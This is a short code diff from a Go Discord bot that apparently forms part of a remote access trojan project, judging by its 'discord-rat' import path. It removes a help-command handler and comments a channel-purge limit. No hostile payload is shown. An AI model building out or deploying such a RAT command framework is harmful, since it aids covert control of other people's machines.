@@ -25,19 +25,12 @@ import (
 	"strings"
 
 	"github.com/bwmarrin/discordgo"
-
-	"github.com/codeuk/discord-rat/cmd/bot/construct"
 )
 
 // BotMessage represents the Messages parent Session and Message attributes.
 type BotMessage struct {
 	Session *discordgo.Session
 	Message *discordgo.MessageCreate
-}
-
-func HandleHelp(message *BotMessage) {
-	// Construct and send the message contaning the commands for the Bot.
-	message.Session.ChannelMessageSendEmbed(message.Message.ChannelID, construct.ConstructHelpEmbed())
 }
 
 func HandlePing(message *BotMessage) {
@@ -59,6 +52,7 @@ func HandlePurge(message *BotMessage) {
 			return
 		}
 
+		// Check if we have exceeded the maximum purge amount and adjust accordingly.
 		if purgeAmount > PURGE_LIMIT {
 			// Purge amount is over the maximum.
 			message.Session.ChannelMessageSend(message.Message.ChannelID, fmt.Sprintf("**Exceeded the purge limit! Purging %d instead...**", PURGE_LIMIT))
